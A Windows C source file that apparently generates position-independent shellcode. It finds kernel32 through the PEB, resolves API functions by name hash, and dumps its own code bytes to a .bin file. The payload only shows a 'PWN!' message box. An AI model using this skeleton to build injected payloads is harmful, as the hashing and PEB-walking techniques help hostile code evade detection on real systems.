#include <windows.h>
#include <winternl.h>
#include "shellcode.h"

#pragma comment(linker, "/Entry:Entry")

#define ROTR32(value, shift)	(((DWORD) value >> (BYTE) shift) | ((DWORD) value << (32 - (BYTE) shift)))
#define LOADLIBRARYA_HASH				0x0726774c
#define MESSAGEBOXA_HASH				0x07568345
#define GETPROCADDRESS_HASH				0x7802f749

#define HASH_LoadLibraryA               0x071d2c76
#define HASH_MessageBoxA                0x4ce54ccf
#define HASH_ExitProcess                0xcbff6bb9

typedef  void* (WINAPI* WinAPIPtr)();
typedef  void* (__cdecl* CFuncPtr)();
typedef ULONG_PTR(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef NTSTATUS(WINAPI* LDRLOADDLL)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
typedef int (WINAPI* MESSAGEBOXA)(HWND, LPSTR, LPSTR, UINT);

typedef struct _ADDRESS_TABLE
{//TODO: 添加退出线程功能
	PVOID        Kernel32_BaseAddr;
	LOADLIBRARYA LoadLibraryA;
	WinAPIPtr    ExitProcess;

	DWORD        sz_String[2];
	DWORD        user[4];
	
	HMODULE      User32_BaseAddr;
	WinAPIPtr    WinExec;
	
	
	WinAPIPtr    MessageBoxA;


}ADDRESS_TABLE;



int EntryMain();
HMODULE GetProcAddrByHash(PVOID LibBaseAddr, DWORD FnHash);
void CreateShellCode();
HMODULE GetKernel32Base();
DWORD HashKey(char* key);
void ShellCodeEnd();

void Entry()
{
	CreateShellCode();
}
void CreateShellCode() {
#if defined(_WIN64)
	HANDLE hFile = CreateFileA("ShellCode_x64.bin", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
#else
	HANDLE hFile = CreateFileA("ShellCode_x86.bin", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
#endif
	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "CreateFileA Error", "Error", MB_ERR_INVALID_CHARS);
		return;
	}
#if defined(_WIN64)
	ULONG_PTR dwSize = (ULONG_PTR)ShellCodeEnd - (ULONG_PTR)EntryMain;
#else
	DWORD dwSize = (DWORD)ShellCodeEnd - (DWORD)EntryMain;
#endif
	DWORD dwWrite = 0;
	WriteFile(hFile, EntryMain, dwSize, &dwWrite, NULL);
	CloseHandle(hFile);
}

// shellcode���߼�
int EntryMain() { 
	ADDRESS_TABLE Addrs;
	Addrs.Kernel32_BaseAddr = GetKernel32Base();
	Addrs.LoadLibraryA = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_LoadLibraryA);
	Addrs.ExitProcess = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_ExitProcess);
	Addrs.user[0] = 0x72657375;
	Addrs.user[1] = 0x642e3233;
	Addrs.user[2] = 0x00006c6c;
	Addrs.User32_BaseAddr = Addrs.LoadLibraryA(Addrs.user);
	Addrs.MessageBoxA = GetProcAddrByHash(Addrs.User32_BaseAddr, HASH_MessageBoxA);
	Addrs.sz_String[0] = 0x214e5750;
	Addrs.sz_String[1] = 0x00000000;
	Addrs.MessageBoxA(0, Addrs.sz_String, 0, MB_OK);
	Addrs.ExitProcess();
	
	


	 return 0;
}

HMODULE GetKernel32Base() 
{
	PPEB pPEB;
	PMY_PEB_LDR_DATA pLdr;
	PLIST_ENTRY pNextModule;
	PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
#if defined(_WIN64)
	pPEB = (PPEB)__readgsqword(0x60);
#else
	pPEB = (PPEB)__readfsdword(0x30);
#endif
	pLdr = (PMY_PEB_LDR_DATA)pPEB->Ldr;
	pNextModule = pLdr->InLoadOrderModuleList.Flink; //get link head ptr

	for (int i = 0; i < 3; i++) {
		pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pNextModule;
		if (pDataTableEntry->BaseDllName.Buffer[8] == 0x006B) break;
		pNextModule = pNextModule->Flink;
	}

	return pDataTableEntry->DllBase;
}

HMODULE GetProcAddrByHash(PVOID LibBaseAddr, DWORD FnHash) {
	DWORD* pNameBase;
	PIMAGE_DOS_HEADER pDos;
	PIMAGE_NT_HEADERS pNT;
	PIMAGE_EXPORT_DIRECTORY pExport;
	HMODULE Function;
	BOOL Found = FALSE;

	pDos = (PIMAGE_DOS_HEADER)LibBaseAddr;
	pNT = (PIMAGE_NT_HEADERS)((ULONG_PTR)LibBaseAddr + ((PIMAGE_DOS_HEADER)LibBaseAddr)->e_lfanew);
	pExport = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)LibBaseAddr + pNT->OptionalHeader.DataDirectory[0].VirtualAddress);
	pNameBase = (DWORD*)((ULONG_PTR)LibBaseAddr + pExport->AddressOfNames);
	int Ordinals;
	for (Ordinals = 0; Ordinals < pExport->NumberOfNames; Ordinals++) 
	{
		char* pName = (char*)LibBaseAddr + *pNameBase;
		if (HashKey(pName) == FnHash) {
			Found = TRUE;
			break;
		}
		pNameBase++;
	}
	if (Found) {
		WORD Index;
		Index = ((WORD*)((ULONG_PTR)LibBaseAddr + pExport->AddressOfNameOrdinals))[Ordinals];
		DWORD offset = ((DWORD*)((ULONG_PTR)LibBaseAddr + pExport->AddressOfFunctions))[Index];
		Function = (HMODULE)((ULONG_PTR)LibBaseAddr + offset);
		return Function;
	}
	return NULL;

}


__forceinline DWORD HashKey(char* key)
{
	DWORD nHash = 0;
	while (*key)
	{
		nHash = (nHash << 5) + nHash + *key++;
	}
	return nHash;
}

void ShellCodeEnd()
{

}
